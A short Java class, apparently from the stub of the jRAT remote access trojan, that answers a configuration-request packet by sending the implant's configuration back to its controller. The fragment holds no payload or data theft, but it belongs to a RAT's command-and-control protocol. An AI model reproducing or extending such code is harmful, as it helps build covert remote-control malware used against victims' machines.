package se.jrat.stub.packets.incoming;

import se.jrat.stub.Configuration;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet66Config;

public class Packet88StubConfig extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet66Config(Configuration.getConfig()));
	}

}
